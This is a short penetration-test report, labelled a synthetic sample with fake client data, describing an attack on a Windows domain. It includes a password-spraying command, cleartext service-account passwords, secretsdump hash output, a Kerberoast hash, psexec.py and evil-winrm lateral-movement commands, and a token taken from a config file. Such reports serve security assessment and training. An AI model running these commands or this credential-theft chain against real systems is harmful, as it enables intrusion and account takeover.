# AcmeCorp internal assessment — synthetic sample with FAKE client data

Scope: 10.20.30.0/24 and dc01.acmecorp.local. Contact: j.smith@acmecorp.com. Codename Project Falcon.

## Initial access

Password spraying against the domain found one weak account.

```bash
crackmapexec smb 10.20.30.10 -u jdoe -p 'Winter2026!' -d ACMECORP
```

ACMECORP\jdoe can read \\fs01.acmecorp.local\it$, which holds a script with password=Sup3rS3cret! for a service
account. The user profile is C:\Users\jdoe and the Linux jump host is /home/svc_backup.

## Credential access

secretsdump on the file server:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

The service account's ticket cracked offline:
$krb5tgs$23$*svc_sql$ACMECORP.LOCAL$cifs/sql01*$abcdef0123456789$deadbeefcafe

Lateral movement with impacket:

```bash
psexec.py acmecorp.local/svc_backup:Sup3rS3cret!@10.20.30.15
evil-winrm -i 10.20.30.15 -u svc_backup -p 'Sup3rS3cret!'
```

API token found in a config: token = ghp_abcdefghijklmnopqrstuvwxyz0123456789AB
See https://github.com/fortra/impacket and https://attack.mitre.org/techniques/T1003/ for background.
Loopback 127.0.0.1 and netmask 255.255.255.0 are not client data.
